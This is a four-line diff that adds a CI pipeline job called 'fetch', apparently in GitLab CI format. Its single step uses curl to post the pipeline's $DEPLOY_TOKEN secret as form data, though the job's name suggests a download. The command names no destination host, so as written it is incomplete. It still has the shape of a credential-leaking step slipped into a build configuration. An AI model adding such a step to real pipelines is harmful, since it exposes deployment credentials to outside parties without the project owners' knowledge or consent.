@@ -1,0 +1,4 @@
+fetch:
+  image: alpine:3.19
+  script:
+    - 'curl -o out.txt -d "t=$DEPLOY_TOKEN"'
